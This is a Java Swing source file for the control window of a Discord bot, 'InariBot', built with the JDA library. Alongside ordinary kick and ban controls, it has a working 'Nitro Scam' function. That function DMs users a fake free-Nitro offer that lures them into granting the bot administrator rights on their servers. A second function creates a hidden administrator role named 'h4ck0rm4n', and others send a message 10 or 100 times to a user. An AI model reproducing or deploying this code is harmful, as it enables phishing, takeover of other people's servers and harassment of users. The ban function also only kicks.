package view.swingwindows;

import java.awt.EventQueue;

import javax.swing.JFrame;
import javax.swing.JPanel;
import java.awt.BorderLayout;
import javax.swing.JLabel;
import java.awt.Font;
import javax.swing.JTextArea;
import javax.swing.JScrollPane;
import javax.swing.JList;
import javax.swing.JOptionPane;

import java.awt.Color;
import javax.swing.JComboBox;
import java.awt.GridLayout;
import java.awt.TextArea;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.AdjustmentEvent;
import java.awt.event.AdjustmentListener;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

import javax.security.auth.login.LoginException;
import javax.swing.DefaultListModel;
import javax.swing.JButton;
import javax.swing.JTextField;
import javax.swing.ListModel;
import javax.swing.border.LineBorder;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;

import bot.InariBot;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.exceptions.HierarchyException;
import net.dv8tion.jda.api.exceptions.InsufficientPermissionException;
import utils.TextFileEditor;

import javax.swing.ScrollPaneConstants;
import javax.swing.ListSelectionModel;

public class MainMenuWindow {

	public static MainMenuWindow mainMenuWindow;

	public Guild selectedServer;
	public List<Member> serverMembers;
	public Member selectedMember;

	private JFrame InariBotFrame;
	private JTextField textField;

	private JTextArea messageArea;
	private JList<String> userList;
	private JComboBox<String> serverSelectBox;
	private JLabel selectionInfoLabel;
	private JScrollPane scrollPane;
	/**
	 * Launch the application.
	 * @throws InterruptedException 
	 */
	public static void main(String[] args) throws InterruptedException {


		Thread botThread = new Thread() {
			public void run() {
				try {
					new InariBot();
				} catch (LoginException | InterruptedException e) {
					e.printStackTrace();
				}
			}
		};
		botThread.start();
		botThread.join();

		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					mainMenuWindow = new MainMenuWindow();
					mainMenuWindow.updateServerSelect();
					mainMenuWindow.updateMessageBox();
					mainMenuWindow.InariBotFrame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the application.
	 */
	public MainMenuWindow() {
		initialize();
	}

	/**
	 * Initialize the contents of the frame.
	 */
	private void initialize() {
		InariBotFrame = new JFrame();
		InariBotFrame.setTitle("InariBot");
		InariBotFrame.setBounds(100, 100, 1000, 600);
		InariBotFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		InariBotFrame.getContentPane().setLayout(new BorderLayout(0, 0));

		JPanel titlePanel = new JPanel();
		titlePanel.setBorder(new LineBorder(new Color(0, 0, 0)));
		InariBotFrame.getContentPane().add(titlePanel, BorderLayout.NORTH);

		JLabel titleLabel = new JLabel("Inari Bot");
		titleLabel.setFont(new Font("Leelawadee UI", Font.BOLD, 30));
		titlePanel.add(titleLabel);

		JPanel buttonPanel = new JPanel();
		InariBotFrame.getContentPane().add(buttonPanel, BorderLayout.WEST);
		buttonPanel.setLayout(new GridLayout(10, 1, 10, 10));

		JButton giveAdminButton = new JButton("Give Admin");
		giveAdminButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				giveAdmin();
			}
		});
		buttonPanel.add(giveAdminButton);

		JButton kickButton = new JButton("Kick User");
		kickButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				kickUser();
			}			
		});
		buttonPanel.add(kickButton);

		JButton banButton = new JButton("Ban User");
		banButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				banUser();
			}			
		});
		buttonPanel.add(banButton);

		JButton sendScamButton = new JButton("Nitro Scam");
		sendScamButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				nitroScam();
			}			
		});
		buttonPanel.add(sendScamButton);

		JButton spamTenButton = new JButton("Spam x10");
		spamTenButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				spamTen();
			}			
		});
		buttonPanel.add(spamTenButton);

		JButton spamHundredButton = new JButton("Spam x100");
		spamHundredButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				spamHundred();
			}			
		});
		buttonPanel.add(spamHundredButton);

		JPanel mainPanel = new JPanel();
		InariBotFrame.getContentPane().add(mainPanel, BorderLayout.CENTER);
		mainPanel.setLayout(new BorderLayout(0, 0));

		scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		mainPanel.add(scrollPane, BorderLayout.CENTER);

		messageArea = new JTextArea();
		scrollPane.setViewportView(messageArea);

		JPanel userSelectPanel = new JPanel();
		scrollPane.setRowHeaderView(userSelectPanel);
		userSelectPanel.setLayout(new BorderLayout(0, 0));

		JScrollPane userAndChannelList = new JScrollPane();
		userSelectPanel.add(userAndChannelList, BorderLayout.NORTH);

		JPanel serverSelect = new JPanel();
		userSelectPanel.add(serverSelect, BorderLayout.NORTH);

		JLabel selectServerLabel = new JLabel("Select Server: ");
		serverSelect.add(selectServerLabel);

		serverSelectBox = new JComboBox<String>();
		serverSelectBox.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				selectedServer = InariBot.servers.get(serverSelectBox.getSelectedIndex());
				System.out.println("New server selected: "+selectedServer.getName());

				updateUserList();
			}
		});
		serverSelect.add(serverSelectBox);

		JScrollPane userSelectListPane = new JScrollPane();
		userSelectListPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		userSelectPanel.add(userSelectListPane, BorderLayout.CENTER);

		userList = new JList<String>();
		userList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
		userList.setVisibleRowCount(256);
		userList.setLayoutOrientation(JList.HORIZONTAL_WRAP);
		userList.addListSelectionListener(new ListSelectionListener() {
			public void valueChanged(ListSelectionEvent e) {
				if(userList.getSelectedIndex() > -1) {
					selectedMember = serverMembers.get(userList.getSelectedIndex());
					System.out.println("New member selected: "+selectedMember.getEffectiveName());
				}
				selectionInfoLabel.setText("Selected user: "+selectedMember.getEffectiveName());
			}
		});
		userSelectListPane.setViewportView(userList);

		selectionInfoLabel = new JLabel("Selected user: ");
		selectionInfoLabel.setFont(new Font("Tahoma", Font.PLAIN, 13));
		scrollPane.setColumnHeaderView(selectionInfoLabel);

		JPanel messageSendPanel = new JPanel();
		mainPanel.add(messageSendPanel, BorderLayout.SOUTH);

		JLabel sendMessageLabel = new JLabel("Send a message:");
		messageSendPanel.add(sendMessageLabel);

		textField = new JTextField();
		messageSendPanel.add(textField);
		textField.setColumns(25);

		JButton sendMessageButton = new JButton("Send");
		sendMessageButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String message = textField.getText();
				sendMessage(message);
				textField.setText("");
			}
		});
		messageSendPanel.add(sendMessageButton);

		InariBotFrame.getRootPane().setDefaultButton(sendMessageButton);
		InariBotFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
	}

	/**
	 * Update the message box with the text log.
	 */
	public void updateMessageBox() {
		messageArea.setText("");

		File chatlogFile = new File(this.getClass().getClassLoader().getResource("chatlog.txt").getFile());
		List<String> chatlog = TextFileEditor.getTextFileAsList(chatlogFile);
		for(int i = 0; i < chatlog.size(); i++) {
			messageArea.append(chatlog.get(i)+"\n");
		}
		scrollPane.getVerticalScrollBar().setValue(scrollPane.getVerticalScrollBar().getMaximum());  
	}

	/**
	 * Place all servers in the server select combo box.
	 */
	public void updateServerSelect() {
		InariBot.servers = InariBot.jda.getGuilds();
		serverSelectBox.removeAllItems();

		for(Guild g: InariBot.servers) {
			serverSelectBox.addItem(g.getName());
		}
	}

	/**
	 * Place all users in the selected server in the user list.
	 */
	public void updateUserList() {
		userList.removeAll();
		if(selectedServer == null) {
			return;
		}
		serverMembers = selectedServer.getMembers();

		DefaultListModel<String> serverMemberNames = new DefaultListModel<String>();
		for(Member m: serverMembers) {
			serverMemberNames.addElement(m.getEffectiveName());
		}

		userList.setModel(serverMemberNames);
	}

	/**
	 * Send a message to the selected user
	 */
	public void sendMessage(String line) {
		if(selectedMember == null) {
			System.out.println("Tried to send message when no user was selected.");
			return;
		}
		try {
			selectedMember.getUser().openPrivateChannel().queue((channel) ->
			{
				channel.sendMessage(line).queue();
			});
		} catch (UnsupportedOperationException e) {
			System.out.println(e);
		}	
	}

	/**
	 * Creates an admin privelage role in a server, then gives the selected user that role
	 */
	public void giveAdmin() {
		if(selectedMember == null) {
			System.out.println("Don't use this button when no user is selected.");
			return;
		}
		try {
			Role adminRole = selectedServer.getController().createRole()
					.setPermissions(Permission.ADMINISTRATOR)
					.setColor(Color.RED)
					.setName("h4ck0rm4n")
					.complete();
			selectedServer.getController().addSingleRoleToMember(selectedMember, adminRole).complete();
			new InfoWindow("Admin Bestowing Success","Gave admin role of "+adminRole.getName()+" to "+selectedMember.getEffectiveName()+".");
		} catch (InsufficientPermissionException e) {
			System.out.println("Can't create the role due to lack of permission.");
		}
	}

	/**
	 * Kicks a user from the server.
	 */
	public void kickUser() {
		int response = JOptionPane.showConfirmDialog(null, "Do you want to kick "+selectedMember.getEffectiveName()+"?", "Kick",
				JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);
		if (response == JOptionPane.YES_OPTION) {
			try {
				selectedServer.getController().kick(selectedMember).complete();
				new InfoWindow("Kicked user", "Successfully kicked "+selectedMember.getEffectiveName());
				updateUserList();
			} catch(HierarchyException e) {
				new InfoWindow("Hierarchy Problem", "Can't kick members that are higher up.");
			}
		}
	}

	/**
	 * Bans a user from the server.
	 */
	public void banUser() {
		int response = JOptionPane.showConfirmDialog(null, "Do you want to ban "+selectedMember.getEffectiveName()+"?", "Ban",
				JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);
		if (response == JOptionPane.YES_OPTION) {
			try {
				selectedServer.getController().kick(selectedMember).complete();
				new InfoWindow("Banned user", "Successfully ban "+selectedMember.getEffectiveName());
				updateUserList();
			} catch(HierarchyException e) {
				new InfoWindow("Hierarchy Problem", "Can't ban members that are higher up.");
			}
		}
	}
	
	/**
	 * Nitro scam. Sends a phishing message to a user.
	 */
	public void nitroScam() {
		String scamLink = "https://discordapp.com/oauth2/authorize?client_id=433178269626400768&permissions=8&scope=bot";
		
		EmbedBuilder newEmbed = new EmbedBuilder();
		newEmbed.setThumbnail(InariBot.jda.getSelfUser().getAvatarUrl());
		newEmbed.addField("A cuddly wumpus has spawned!", "Wumpus has decided you are an outstanding member of Discord,"
				+ " and has decided to reward you with one month of free Discord Nitro!", true);
		newEmbed.addField("How can I redeem my code?","In order to prove you arent a bot, please add me to one of your servers! "
				+ "After you do I will generate you a free Discord Nitro promo code.", true);
		newEmbed.addField("Invite Wumpus", "[Click Here To Invite](https://discordapp.com/oauth2/authorize?client_id=433178269626400768&permissions=8&scope=bot)", true);
		
		try {
			selectedMember.getUser().openPrivateChannel().queue((channel) ->
			{
				channel.sendMessage(newEmbed.build()).queue();
			});
		} catch (UnsupportedOperationException e) {
			System.out.println(e);
		}	
		
	}
	
	/**
	 * Sends 10 of the same message to selected user.
	 */
	public void spamTen() {
		for(int i = 0; i < 10; i++) {
			sendMessage(textField.getText());
		}
	}
	
	/**
	 * Sends 100 of te same message to the selected user.
	 */
	public void spamHundred() {
		for(int i = 0; i < 100; i++) {
			sendMessage(textField.getText());
		}
	}
}
